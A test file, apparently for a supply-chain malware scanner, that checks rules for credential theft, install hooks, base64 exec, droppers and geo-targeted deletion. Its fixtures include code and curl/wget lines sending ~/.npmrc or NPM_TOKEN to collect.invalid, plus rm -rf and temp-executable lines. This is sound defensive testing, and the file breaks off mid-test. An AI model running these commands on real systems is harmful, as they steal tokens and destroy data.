import { performance } from "node:perf_hooks";
import { describe, expect, it } from "vitest";
import { performanceBudget } from "./performance-budget.js";
import {
  CORRELATED_PATTERN_MATCHERS,
  maskMixedCommentsPreservingStrings,
  matchCharacterCodeObfuscation,
} from "../correlated-pattern-matchers.js";
import type { CorrelatedPatternMatcher } from "../types.js";

const EXPECTED_RULES = [
  "PYPI_B64_EXEC_COMBINED",
  "PYPI_CUSTOM_INSTALL",
  "PYPI_CUSTOM_DEVELOP",
  "PYPI_CUSTOM_EGG_INFO",
  "PYPI_CUSTOM_SDIST",
  "PYPI_CUSTOM_BUILD_EXT",
  "SHAI_HULUD_CRED_STEAL",
  "PROTESTWARE_IP_GEO_V2",
  "PROXY_HANDLER_TRAP",
  "DROPPER_TEMP_EXEC",
] as const;

const matches = (matcher: CorrelatedPatternMatcher, source: string) =>
  [...matcher(source)];

const expectValidMatches = (
  matcher: CorrelatedPatternMatcher,
  source: string,
  minimum = 1,
) => {
  const found = matches(matcher, source);
  expect(found.length).toBeGreaterThanOrEqual(minimum);
  for (const match of found) {
    expect(match.start).toBeGreaterThanOrEqual(0);
    expect(match.end).toBeGreaterThan(match.start);
    expect(match.end).toBeLessThanOrEqual(source.length);
    expect(match.evidence.length).toBeLessThanOrEqual(240);
  }
  return found;
};

describe("correlated structural pattern matchers", () => {
  it("exports exactly the ten shipped correlated rules", () => {
    expect(Object.keys(CORRELATED_PATTERN_MATCHERS).sort()).toEqual(
      [...EXPECTED_RULES].sort(),
    );
  });

  describe("PyPI cmdclass objects", () => {
    const cases = [
      ["PYPI_CUSTOM_INSTALL", "install"],
      ["PYPI_CUSTOM_DEVELOP", "develop"],
      ["PYPI_CUSTOM_EGG_INFO", "egg_info"],
      ["PYPI_CUSTOM_SDIST", "sdist"],
      ["PYPI_CUSTOM_BUILD_EXT", "build_ext"],
    ] as const;

    it.each(cases)("finds %s only as a key in the cmdclass object", (rule, key) => {
      const source = `setup(\n  name="safe",\n  cmdclass = {\n    '${key}': CustomCommand,\n  },\n)\n`;
      expectValidMatches(CORRELATED_PATTERN_MATCHERS[rule], source);

      const unrelated = `cmdclass = {'other': CustomCommand}\nunrelated = {'${key}': CustomCommand}\n`;
      expect(matches(CORRELATED_PATTERN_MATCHERS[rule], unrelated)).toEqual([]);
    });

    it("discovers an active cmdclass object nested inside an earlier one", () => {
      const source = "setup(cmdclass={'wrapper': (lambda: setup(cmdclass={'install': Evil}))()})";
      expectValidMatches(CORRELATED_PATTERN_MATCHERS.PYPI_CUSTOM_INSTALL, source);
    });
    it("ignores key-shaped text in comments, values, and nested objects", () => {
      const matcher = CORRELATED_PATTERN_MATCHERS.PYPI_CUSTOM_INSTALL;
      expect(matches(matcher, "# cmdclass = {'install': Evil}\ncmdclass = {'other': 'install'}\n")).toEqual([]);
      expect(matches(matcher, "cmdclass = {'other': {'install': Evil}}\n")).toEqual([]);
    });
  });

  describe("PYPI_B64_EXEC_COMBINED", () => {
    const matcher = CORRELATED_PATTERN_MATCHERS.PYPI_B64_EXEC_COMBINED;

    it.each([
      "exec(base64.b64decode(blob))",
      "payload = base64.b64decode(blob); exec(payload)",
      "payload = base64.b64decode(blob)\nverify(payload)\nexec(payload)",
    ])("detects decoded data reaching exec: %s", (source) => {
      expectValidMatches(matcher, source);
    });

    it("retains a viable decode path across an indented conditional reassignment", () => {
      const source = `payload = base64.b64decode(blob)
if False:
  payload = trusted
exec(payload)`;
      expectValidMatches(matcher, source);
    });
    it.each([
      "payload = base64.b64decode(blob)\n# exec(payload)",
      "payload = base64.b64decode(blob)\nmessage = 'exec(payload)'",
      "payload = base64.b64decode(blob)\nexec(trusted)",
      "payload = base64.b64decode(blob)\npayload = trusted\nexec(payload)",
      "obj.exec(base64.b64decode(blob))",
    ])("rejects non-executable or differently assigned data: %s", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });
  });

  describe("SHAI_HULUD_CRED_STEAL", () => {
    const matcher = CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL;

    it.each([
      `const creds = fs.readFileSync(process.env.HOME + "/.npmrc", "utf8");
require("axios").post("https://collect.invalid/n", { token: creds });`,
      `const token = process.env.NPM_TOKEN;
fetch("https://collect.invalid/n", { method: "POST", body: token });`,
      `fetch("https://collect.invalid/n?t=" + process.env["NPM_TOKEN"]);`,
      `token = os.getenv("NPM_TOKEN")
requests.post("https://collect.invalid/n", data=token)`,
      `const token = process.env.NPM_TOKEN;
request("https://collect.invalid/n", { body: token });`,
      `token = os.getenv("NPM_TOKEN")
urllib.request.urlopen("https://collect.invalid/n", data=token)`,
    ])("tracks a real credential source into a network sink: %s", (source) => {
      expectValidMatches(matcher, source);
    });

    it.each([
      `const config = readFileSync(configPath, "utf8");
const server = { fs: { deny: [".env", ".npmrc", ".yarnrc.yml"] } };
fetch("/ordinary-health-check");`,
      `/** @default ['.env', '.npmrc', '.yarnrc.yml'] */
interface ServerFsOptions { deny?: string[]; readFileSync?: never }`,
      `const example = "process.env.NPM_TOKEN";
fetch("/docs", { body: example });`,
      `const token = process.env.NPM_TOKEN;
logLocally(token);`,
      `const token = process.env.NPM_TOKEN;
token = "public";
fetch("/ordinary", { body: token });`,
      `const clean = "public", token = process.env.NPM_TOKEN;
fetch("/ordinary", { body: clean });`,
      `const token = process.env.NPM_TOKEN;
function local(token) { fetch("/ordinary", { body: token }); }`,
      `const token = process.env.NPM_TOKEN;
cache.get(token);`,
      `const token = process.env.NPM_TOKEN;
client.send(token);`,
    ])("rejects inert mentions, unrelated I/O, and killed flows: %s", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });

    it.each([
      `const token = process.env.NPM_TOKEN;
const send = token => fetch("/ordinary", { body: token });`,
      `const token = process.env.NPM_TOKEN;
const send = (token) => fetch("/ordinary", { body: token });`,
      `const token = process.env.NPM_TOKEN;
const worker = { send(token) { fetch("/ordinary", { body: token }); } };`,
      `const token = process.env.NPM_TOKEN;
class Worker { *send(token) { fetch("/ordinary", { body: token }); } }`,
      `const token = process.env.NPM_TOKEN;
const send = ({ token }) => fetch("/ordinary", { body: token });`,
      `const token = process.env.NPM_TOKEN;
def send(token):
    requests.post("https://ordinary.invalid/n", data=token)`,
      `token = os.getenv("NPM_TOKEN")
send = lambda token: requests.post("https://ordinary.invalid/n", data=token)`,
    ])("respects function and destructuring parameter shadowing: %s", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });

    it("isolates assignments to their JavaScript and Python function scopes", () => {
      const javascript = `function prepare() {
  token = process.env.NPM_TOKEN;
}
fetch("/ordinary", { body: token });`;
      expect(matches(matcher, javascript)).toEqual([]);

      const nestedDefault = `const factory = (token = process.env.NPM_TOKEN) => "safe";
fetch("/ordinary", { body: factory });`;
      expect(matches(matcher, nestedDefault)).toEqual([]);

      const python = `token = os.getenv("NPM_TOKEN")
def prepare():
    token = "clean"
requests.post("https://collect.invalid/n", data=token)`;
      expectValidMatches(matcher, python);
    });

    it.each([
      `function send() {
  const token = process.env.NPM_TOKEN;
  fetch("https://collect.invalid/n", { body: token });
}`,
      `def send():
    token = os.getenv("NPM_TOKEN")
    requests.post("https://collect.invalid/n", data=token)`,
      `const send = (token = process.env.NPM_TOKEN) => fetch("https://collect.invalid/n", { body: token });`,
    ])("retains real credential flow inside a local scope: %s", (source) => {
      expectValidMatches(matcher, source);
    });

    it.each([
      `const creds = readFileSync("/home/user/.NPMRC");
fetch("https://collect.invalid/n", { body: creds });`,
      `const creds = readFileSync(process.env.NPM_CONFIG_USERCONFIG);
fetch("https://collect.invalid/n", { body: creds });`,
    ])("keeps case-insensitive credential paths reachable through every gate: %s", (source) => {
      expectValidMatches(matcher, source);
    });
    it.each([
      `creds = Path(".npmrc").read_text()
requests.post("https://collect.invalid/n", data=creds)`,
      `creds = Path.home().joinpath(".npmrc").read_text()
requests.post("https://collect.invalid/n", data=creds)`,
      `const token = process.env.NPM_TOKEN;
require("https").request("https://collect.invalid/?token=" + token);`,
      `const axios = require("axios");
const token = process.env.NPM_TOKEN;
axios.post("https://collect.invalid/n", token);`,
      `import axios from "axios";
const token = process.env.NPM_TOKEN;
axios.post("https://collect.invalid/n", token);`,
      `import requests
token = os.getenv("NPM_TOKEN")
requests.post("https://collect.invalid/n", data=token)`,
      `from urllib import request
token = os.getenv("NPM_TOKEN")
request.urlopen("https://collect.invalid/n", data=token)`,
    ])("recognises exact pathlib and CommonJS credential flows: %s", (source) => {
      expectValidMatches(matcher, source);
    });

    it.each([
      `const token = process.env.NPM_TOKEN;
require("./cache").post("/ordinary", token);`,
      `const token = process.env.NPM_TOKEN;
require("ordinary-library").post("/ordinary", token);`,
      `const marker = ".npmrc";
creds = Path("README.md").read_text()
requests.post("https://ordinary.invalid/n", data=creds)`,
    ])("rejects non-network CommonJS modules and unrelated read_text calls: %s", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });

  });

  describe("credential-flow precision edges", () => {
    const matcher = CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL;

    it.each([
      `const token = process.env.NPM_TOKEN;
const body = token;
fetch("/ordinary", { body });`,
      `let first = process.env.NPM_TOKEN;
let second = first;
let third = second;
fetch("/ordinary", { body: third });`,
      `creds = (Path.home() / ".npmrc").read_text()
requests.post("https://collect.invalid/n", data=creds)`,
    ])("keeps aliases and exact pathlib division flows: %s", (source) => {
      expectValidMatches(matcher, source);
    });

    it.each([
      `const token = process.env.NPM_TOKEN;
const body = token;
body = "public";
fetch("/ordinary", { body });`,
      `const token = process.env.NPM_TOKEN;
function local(fetch) { fetch("/ordinary", { body: token }); }`,
      `const token = process.env.NPM_TOKEN;
const fetch = (...values) => console.log(values);
fetch("/ordinary", { body: token });`,
      `const token = process.env.NPM_TOKEN;
function local() { fetch("/ordinary", { body: token }); let token; }`,
      `const token = process.env.NPM_TOKEN;
function local() { fetch("/ordinary", { body: token }); var token; }`,
      `const token = process.env.NPM_TOKEN;
function local() { fetch("/ordinary", { body: token }); const { token } = clean; }`,
      `const token = process.env.NPM_TOKEN;
try { work(); } catch (token) { fetch("/ordinary", { body: token }); }`,
      `const factory = (token = process.env.NPM_TOKEN) => "safe";
fetch("/ordinary", { body: token });`,
      `const token = process.env.NPM_TOKEN;
loader.require("axios").post("/ordinary", token);`,
      `const token = process.env.NPM_TOKEN;
loader?.require("axios").post("/ordinary", token);`,
      `const token = process.env.NPM_TOKEN;
function local(requests) { requests.post("/ordinary", token); }`,
      `const token = process.env.NPM_TOKEN;
const axios = { post: (...values) => console.log(values) };
axios.post("/ordinary", token);`,
      `const token = process.env.NPM_TOKEN;
function local(window) { window.fetch("/ordinary", { body: token }); }`,
      `const token = process.env.NPM_TOKEN;
const http = { request: (...values) => console.log(values) };
http.request("/ordinary", token);`,
      `x=1# token = os.getenv("NPM_TOKEN")
requests.post("https://ordinary.invalid/n", data=token)`,
      `token = os.getenv("NPM_TOKEN")
def local(requests):
    requests.post("https://ordinary.invalid/n", data=token)`,
      `token = os.getenv("NPM_TOKEN")
def local(urllib):
    urllib.request.urlopen("https://ordinary.invalid/n", data=token)`,
      `creds = fake.Path(".npmrc").read_text()
requests.post("https://ordinary.invalid/n", data=creds)`,
      `creds = Path(".npmrc-example").read_text()
requests.post("https://ordinary.invalid/n", data=creds)`,
      `const creds = readFileSync(".npmrc-example");
fetch("/ordinary", { body: creds });`,
    ])("rejects killed, shadowed, commented, and inexact flows: %s", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });
  });
  describe("declaration keyword and lexical block ownership", () => {
    const matcher = CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL;

    it.each([
      `const token = process.env.NPM_TOKEN;
const config = {} as const
fetch("/ordinary", { body: token });`,
      `const
  token = process.env.NPM_TOKEN;
fetch("/ordinary", { body: token });`,
      `const token = process.env.NPM_TOKEN;
const config = { const: 1 };
fetch("/ordinary", { body: token });`,
      `const token = process.env.NPM_TOKEN;
class Holder { const = 1; }
fetch("/ordinary", { body: token });`,
      `const token = process.env.NPM_TOKEN;
{ fetch("/ordinary", { body: token }); }`,
      `{
  const token = process.env.NPM_TOKEN;
  fetch("/ordinary", { body: token });
}`,
      `const token = process.env.NPM_TOKEN;
const config = { token: "clean" };
fetch("/ordinary", { body: token });`,
    ])("retains genuine declarations and malicious outer/inner flows: %s", (source) => {
      expectValidMatches(matcher, source);
    });

    it.each([
      `const token = process.env.NPM_TOKEN;
{ fetch("/ordinary", { body: token }); const token = "clean"; }`,
      `const token = process.env.NPM_TOKEN;
for (const token of clean) { fetch("/ordinary", { body: token }); }`,
      `const token = process.env.NPM_TOKEN;
if (ready) { fetch("/ordinary", { body: token }); let token; }`,
      `const token = process.env.NPM_TOKEN;
function local() { fetch("/ordinary", { body: token }); { var token; } }`,
    ])("rejects lexical and hoisted block shadows: %s", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });
  });
  describe("nested initializer scope discovery", () => {
    const matcher = CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL;

    it.each([
      `const token = process.env.NPM_TOKEN;
const send = () => { fetch("/ordinary", { body: token }); const token = "clean"; };`,
      `const token = process.env.NPM_TOKEN;
const worker = { send() { fetch("/ordinary", { body: token }); const token = "clean"; } };`,
    ])("predeclares nested lexical bindings without leaking the outer source: %s", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });

    it.each([
      `const token = process.env.NPM_TOKEN;
const send = () => { fetch("/ordinary", { body: token }); };`,
      `const token = process.env.NPM_TOKEN;
const worker = { send() { fetch("/ordinary", { body: token }); } };`,
    ])("retains malicious outer-source closures: %s", (source) => {
      expectValidMatches(matcher, source);
    });
  });
  describe("private credential binding identities", () => {
    const matcher = CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL;

    it.each([
      `const token = process.env.NPM_TOKEN;
class Vault { #token = "clean"; }
fetch("/ordinary", { body: token });`,
      `class Vault {
  #token = process.env.NPM_TOKEN;
  send() { fetch("/ordinary", { body: this.#token }); }
}`,
    ])("keeps real bare and private flows independent: %s", (source) => {
      expectValidMatches(matcher, source);
    });

    it.each([
      `class Vault { #token = process.env.NPM_TOKEN; }
const token = "public";
fetch("/ordinary", { body: token });`,
      `const token = process.env.NPM_TOKEN;
class Vault {
  #token = "clean";
  send() { fetch("/ordinary", { body: this.#token }); }
}`,
    ])("does not transfer taint between private and bare names: %s", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });
  });
  describe("mixed lexical regex masking", () => {
    it("preserves offsets and strings while blanking comments and regex literals", () => {
      const source = [
        'const docs = "fetch(token)";',
        "// fetch(token)",
        "const re = /fetch\\(token\\)\\/[}]/gi;",
        "const ratio = total / count;",
      ].join("\n");
      const masked = maskMixedCommentsPreservingStrings(source);
      expect(masked).toHaveLength(source.length);
      expect(masked).toContain('"fetch(token)"');
      expect(masked).not.toContain("// fetch(token)");
      expect(masked).not.toContain("/fetch\\(token\\)\\/[}]/gi");
      expect(masked).toContain("total / count");
      expect(masked.split("\n")).toHaveLength(source.split("\n").length);
    });

    it("blanks no-space Python comments without hiding JS private names or shell expansions", () => {
      const source = [
        "x=1# back_connect",
        "class Vault {",
        "  #field = 1;",
        "  read() { return this.#field; }",
        "}",
        "echo ${value#prefix} ${value##prefix} ${#value} socks5://198.51.100.7:1080",
      ].join("\n");
      const masked = maskMixedCommentsPreservingStrings(source);
      expect(masked).toHaveLength(source.length);
      expect(masked).not.toContain("back_connect");
      expect(masked).toContain("#field = 1");
      expect(masked).toContain("this.#field");
      expect(masked).toContain("${value#prefix}");
      expect(masked).toContain("${value##prefix}");
      expect(masked).toContain("${#value}");
      expect(masked).toContain("socks5://198.51.100.7:1080");
    });
    it("does not interpret call names or braces inside regex literals as code", () => {
      const credentialMatcher = CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL;
      expect(matches(
        credentialMatcher,
        `const token = process.env.NPM_TOKEN;
const re = /fetch(token)/;`,
      )).toEqual([]);
      expect(matches(
        credentialMatcher,
        `const token = process.env.NPM_TOKEN;
function local(token) {
  const closing = /}/;
  fetch("/ordinary", { body: token });
}`,
      )).toEqual([]);

      const charcode = `const payload = String.fromCharCode(97, 98, 99, 100, 101);
const re = /eval(payload)/;`;
      expect(matches(matchCharacterCodeObfuscation, charcode)).toEqual([]);
    });

    it("keeps division and a real sink visible", () => {
      const source = `const token = process.env.NPM_TOKEN;
const ratio = total / count;
fetch("/ordinary", { body: token, ratio });`;
      expectValidMatches(CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL, source);
    });
  });
  it.each([
    `const token = process.env.NPM_TOKEN;
if (ready) /fetch(token)/.test(value);`,
    `const token = process.env.NPM_TOKEN;
if (check(value)) /fetch(token)/.test(value);`,
    `const token = process.env.NPM_TOKEN;
do /fetch(token)/.test(value); while (ready);`,
  ])("keeps regex-literal calls inert after control-flow headers: %s", (source) => {
    expect(matches(CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL, source)).toEqual([]);
  });
  describe("character-code execution argument flow", () => {
    const declaration = "const payload = String.fromCharCode(97, 98, 99, 100, 101);";

    it.each([
      `setTimeout(() => log(payload), 100);`,
      `setTimeout(console.log, 100, payload);`,
      `spawn("echo", [], { env: { TABLE: payload } });`,
      `exec("echo ok", { env: { TABLE: payload } });`,
      `Function(payload, "return 1");`,
    ])("ignores encoded data outside the executed code/command position: %s", (sink) => {
      expect(matches(matchCharacterCodeObfuscation, `${declaration}\n${sink}`)).toEqual([]);
    });

    it.each([
      `setTimeout(payload, 100);`,
      `eval(transform(payload));`,
      `Function("x", payload);`,
    ])("retains encoded data in an executed code position: %s", (sink) => {
      expectValidMatches(matchCharacterCodeObfuscation, `${declaration}\n${sink}`);
    });
  });
  describe("character-code settled execution flow", () => {
    const declaration = "const payload = String.fromCharCode(97, 98, 99, 100, 101);";

    it.each([
      `const body = payload;
eval(body);`,
      `const body = payload;
const command = body;
eval(command);`,
      `spawn("sh", ["-c", payload]);`,
      `spawn("cmd.exe", ["/c", payload]);`,
    ])("retains aliases and shell command positions: %s", (sink) => {
      expectValidMatches(matchCharacterCodeObfuscation, `${declaration}\n${sink}`);
    });

    it.each([
      `let body = payload;
body = "public";
eval(body);`,
      `setTimeout(console.log.bind(null, payload), 100);`,
      `if (ready) /eval(payload)/.test(value);`,
    ])("rejects overwritten aliases, callbacks, and regex literals: %s", (sink) => {
      expect(matches(matchCharacterCodeObfuscation, `${declaration}\n${sink}`)).toEqual([]);
    });
  });
  describe("SHAI_HULUD_CRED_STEAL_SHELL", () => {
    const matcher = CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL;

    it.each([
      `curl -X POST -d "$NPM_TOKEN" https://collect.invalid/n`,
      `token=$NPM_TOKEN
wget --post-data="$token" https://collect.invalid/n`,
      `token=$NPM_TOKEN
body=$token
curl -d "$body" https://collect.invalid/n`,
      `export token=$NPM_TOKEN
curl -d "$token" https://collect.invalid/n`,
      `curl -d "\${NPM_TOKEN:-}" https://collect.invalid/n`,
      `send() { local token=$NPM_TOKEN; curl -d "$token" https://collect.invalid/n; }`,
      `readonly token=$NPM_TOKEN
curl -d "$token" https://collect.invalid/n`,
      `declare token=$NPM_TOKEN
curl -d "$token" https://collect.invalid/n`,
      `typeset -x token=$NPM_TOKEN
curl -d "$token" https://collect.invalid/n`,
      `creds=$(cat ~/.npmrc)
curl --data-binary "$creds" https://collect.invalid/n`,
      `curl --data-binary @~/.npmrc https://collect.invalid/n`,
    ])("tracks shell credentials into curl or wget: %s", (source) => {
      expectValidMatches(matcher, source);
    });

    it.each([
      `cat ~/.npmrc | curl --data-binary @- https://collect.invalid/n`,
      `cat "$npm_config_userconfig" | curl --data-binary @- https://collect.invalid/n`,
      `cat "$NPM_CONFIG_USERCONFIG" | curl --data-binary @- https://collect.invalid/n`,
      `curl --data-binary @"$npm_config_userconfig" https://collect.invalid/n`,
      `cat ~/.npmrc | wget --post-file=- https://collect.invalid/n`,
      String.raw`curl \
  --data "$NPM_TOKEN" \
  https://collect.invalid/n`,
    ])("tracks piped and escaped-newline logical shell commands: %s", (source) => {
      expectValidMatches(matcher, source);
    });

    it.each([
      `cat ~/.npmrc | curl https://ordinary.invalid/n`,
      `echo "$npm_config_userconfig" | curl --data-binary @- https://ordinary.invalid/n`,
      `curl --data "$NPM_CONFIG_USERCONFIG" https://ordinary.invalid/n`,
      `cat ~/.npmrc; curl --data-binary @- https://ordinary.invalid/n`,
      `cat ~/.config/toolrc | curl --data-binary @- https://ordinary.invalid/n
# .npmrc marker only`,
    ])("rejects shell pipelines without a credential-bearing stdin flow: %s", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });
    it.each([
      `echo "$NPM_TOKEN"`,
      `token=$NPM_TOKEN
token=public
curl -d "$token" https://ordinary.invalid/n`,
      `token=$NPM_TOKEN
send() { local token=public; curl -d "$token" https://ordinary.invalid/n; }`,
      `send() { local token=$NPM_TOKEN; }
curl -d "$token" https://ordinary.invalid/n`,
      `cmd="curl -d $NPM_TOKEN https://ordinary.invalid/n"`,
      `# curl -d "$NPM_TOKEN" https://ordinary.invalid/n`,
    ])("rejects inert, killed, quoted, and commented shell flows: %s", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });
  });

  describe("shell execution and expansion precision", () => {
    const matcher = CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL;

    it.each([
      `result="$(curl -d "$NPM_TOKEN" https://collect.invalid/n)"`,
      "result=`curl -d \"$NPM_TOKEN\" https://collect.invalid/n`",
    ])("keeps executable command substitutions: %s", (source) => {
      expectValidMatches(matcher, source);
    });

    it.each([
      `curl -o "$NPM_TOKEN" https://ordinary.invalid/n`,
      `wget -O "$NPM_TOKEN" https://ordinary.invalid/n`,
      `token=$NPM_TOKEN
curl --output "$token" https://ordinary.invalid/n`,
      `curl -d '$NPM_TOKEN' https://ordinary.invalid/n`,
      String.raw`curl -d \$NPM_TOKEN https://ordinary.invalid/n`,
      `token='$NPM_TOKEN'
curl -d "$token" https://ordinary.invalid/n`,
      String.raw`token=\$NPM_TOKEN
curl -d "$token" https://ordinary.invalid/n`,
      `echo '$NPM_TOKEN' | curl --data-binary @- https://ordinary.invalid/n`,
      String.raw`echo \$NPM_TOKEN | curl --data-binary @- https://ordinary.invalid/n`,
    ])("rejects output-only and non-expanding shell uses: %s", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });
  });
  describe("PROXY_HANDLER_TRAP", () => {
    const matcher = CORRELATED_PATTERN_MATCHERS.PROXY_HANDLER_TRAP;

    it.each([
      "const p = new Proxy(target, { get: (obj, key) => { fetch(key); return obj[key]; } });",
      "const p = new Proxy(target, { set(obj, key, value) { eval(value); obj[key] = value; } });",
      "const p = new Proxy(target, { get: () => `value: ${fetch(secret)}` });",
    ])("detects a hostile operation inside a trap", (source) => {
      expectValidMatches(matcher, source);
    });

    it.each([
      [
        "double-quoted",
        'const p = new Proxy(target, { "get": (obj, key) => { fetch(key); return obj[key]; } });',
      ],
      [
        "single-quoted",
        "const p = new Proxy(target, { 'get': (obj, key) => { fetch(key); return obj[key]; } });",
      ],
      [
        "computed quoted",
        'const p = new Proxy(target, { ["get"]: (obj, key) => { fetch(key); return obj[key]; } });',
      ],
    ])("detects a hostile operation under a %s trap key", (_name, source) => {
      expectValidMatches(matcher, source);
    });
    it("continues past an earlier Proxy whose handler is an identifier", () => {
      const source = "const normal = new Proxy(target, sharedHandler); const hostile = new Proxy(target, { get: () => fetch(secret) });";
      expectValidMatches(matcher, source);
    });

    it("discovers a hostile Proxy nested inside an earlier Proxy call", () => {
      const source = "new Proxy(a, wrap(new Proxy(b, { get: () => fetch(secret) })))";
      const found = expectValidMatches(matcher, source);
      expect(found.some((match) => match.start === source.lastIndexOf("new Proxy"))).toBe(true);
    });
    it.each([
      `return new Proxy(process.env, {
  get(_, key) {
    if (typeof key !== "string") return;
    return process.env[key];
  },
  set(_, key, value) {
    process.env[key] = value;
    return true;
  },
});`,
      `const env = process.env;
return new Proxy(env, {
  get(_, key) { return process.env[key]; },
  set(_, key, value) { process.env[key] = value; return true; },
});`,
      "const p = new Proxy(target, { get: (obj, key) => obj[key] }); fetch('/api');",
      "const p = new Proxy(target, { helper: () => fetch('/api'), get: (obj, key) => obj[key] });",
      "const p = new Proxy(target, { get: () => 'fetch(secret)' });",
      "const p = new Proxy(target, { get: () => `fetch(secret)` });",
      'const p = new Proxy(target, { "get": (obj, key) => obj[key] }); fetch("/api");',
      "const p = new Proxy(target, { 'get': () => 'fetch(secret)' });",
      'const p = new Proxy(target, { ["get"]: () => "fetch(secret)" });',
      'const sample = \'new Proxy(target, { "get": () => fetch(secret) })\';',
      "// new Proxy(target, { get: () => fetch(secret) })",
    ])("does not borrow hostile-looking text outside executable trap code", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });
  });

  describe("PROTESTWARE_IP_GEO_V2", () => {
    const matcher = CORRELATED_PATTERN_MATCHERS.PROTESTWARE_IP_GEO_V2;

    it.each([
      "const geo = require('geoip-lite'); if (geo.lookup(ip)) fs.unlinkSync('/data');",
      "const reader = maxmind.open(db); fs.rmSync(process.cwd(), { recursive: true });",
      "ipinfo; execSync('rm -rf /home/service');",
    ])("detects geo-targeted sensitive destruction", (source) => {
      expectValidMatches(matcher, source);
    });

    it("discovers sensitive destruction nested in a safe outer cleanup call", () => {
      expectValidMatches(matcher, "maxmind; rm('/tmp/cache', rmSync('/data'))");
    });

    it("keeps JavaScript private methods executable in mixed lexical mode", () => {
      expectValidMatches(matcher, "const maxmind = 1; class X { #go(){ rmSync('/data') } }");
      expect(matches(matcher, "maxmind; #comment() rmSync('/data')")).toEqual([]);
    });
    it.each([
      "const maxmind = require('maxmind'); fs.unlinkSync(tempArchive);",
      "const maxmind = require('maxmind'); fs.rmSync('/var/tmp/GeoLite2.mmdb');",
      "// maxmind; fs.rmSync('/data')",
      "fs.rmSync('/data'); const maxmind = require('maxmind');",
    ])("rejects safe cleanup, comments, and reversed correlation", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });
  });

  describe("DROPPER_TEMP_EXEC", () => {
    const matcher = CORRELATED_PATTERN_MATCHERS.DROPPER_TEMP_EXEC;

    it.each([
      "const p = os.tmpdir() + '/payload.exe'; writeFileSync(p, data); execSync(p);",
      "writeFile(TEMP + '/payload.exe', data); exec(TEMP + '/payload.exe');",
      "write_bytes('/tmp/run.ps1', data); ShellExecute('/tmp/run.ps1');",
    ])("detects the same written and executed path", (source) => {
      expectValidMatches(matcher, source);
    });

    it("records a nested write before a later payload execution", () => {
      const source = "fetch(url); exec('true', writeFileSync('/tmp/payload.exe', data)); execSync('/tmp/payload.exe')";
      expectValidMatches(matcher, source);
    });

    it("keeps JavaScript private methods executable in the shared mixed lexer", () => {
      const source = "class X { #go(){ writeFileSync('/tmp/payload.exe', data); execSync('/tmp/payload.exe') } }";
      expectValidMatches(matcher, source);
    });
    it.each([
      "const a = '/tmp/a.exe'; const b = '/tmp/b.exe'; writeFileSync(a, data); execSync(b);",
      "writeFileSync(installDir + '/package.json', '{}'); child_process.execSync('node --version');",
      "const p = '/tmp/a.exe'; writeFileSync(p, data); p = '/tmp/b.exe'; execSync(p);",
      "const text = \"writeFileSync('/tmp/a.exe'); execSync('/tmp/a.exe')\";",
    ])("rejects mismatched, reassigned, or non-code paths", (source) => {
      expect(matches(matcher, source)).toEqual([]);
    });
  });

  it("finds every correlation beyond 5,000 characters on one physical line", () => {
    const padding = "x++;".repeat(1_300);
    const cases: Array<[CorrelatedPatternMatcher, string]> = [
      [
        CORRELATED_PATTERN_MATCHERS.PYPI_B64_EXEC_COMBINED,
        `payload=base64.b64decode(blob);${padding}exec(payload)`,
      ],
      [
        CORRELATED_PATTERN_MATCHERS.PYPI_CUSTOM_INSTALL,
        `cmdclass={${" ".repeat(5_200)}'install':CustomInstall}`,
      ],
      [
        CORRELATED_PATTERN_MATCHERS.PYPI_CUSTOM_DEVELOP,
        `cmdclass={${" ".repeat(5_200)}'develop':CustomDevelop}`,
      ],
      [
        CORRELATED_PATTERN_MATCHERS.PYPI_CUSTOM_EGG_INFO,
        `cmdclass={${" ".repeat(5_200)}'egg_info':CustomEggInfo}`,
      ],
      [
        CORRELATED_PATTERN_MATCHERS.PYPI_CUSTOM_SDIST,
        `cmdclass={${" ".repeat(5_200)}'sdist':CustomSdist}`,
      ],
      [
        CORRELATED_PATTERN_MATCHERS.PYPI_CUSTOM_BUILD_EXT,
        `cmdclass={${" ".repeat(5_200)}'build_ext':CustomBuildExt}`,
      ],
      [
        CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL,
        `const creds=readFileSync("/home/user/.npmrc");${padding}fetch("https://x.invalid",{body:creds})`,
      ],
      [
        CORRELATED_PATTERN_MATCHERS.SHAI_HULUD_CRED_STEAL,
        `token=$NPM_TOKEN;${padding}curl -d "$token" https://x.invalid`,
      ],
      [
        CORRELATED_PATTERN_MATCHERS.PROXY_HANDLER_TRAP,
        `new Proxy(target,{get:(obj,key)=>{${padding}fetch(key);return obj[key]}})`,
      ],
      [
        CORRELATED_PATTERN_MATCHERS.PROTESTWARE_IP_GEO_V2,
        `maxmind;${padding}rmSync('/data')`,
      ],
      [
        CORRELATED_PATTERN_MATCHERS.DROPPER_TEMP_EXEC,
        `writeFileSync('/tmp/payload.exe',data);${padding}execSync('/tmp/payload.exe')`,
      ],
    ];

    for (const [matcher, source] of cases) {
      const found = expectValidMatches(matcher, source);
      expect(found[0]!.end - found[0]!.start).toBeGreaterThan(5_000);
      expect(found[0]!.evidence.length).toBe(240);
    }
  });

  it("stays under ten seconds on a 5 MiB assignment-heavy near miss", { timeout: performanceBudget(15_000) }, () => {
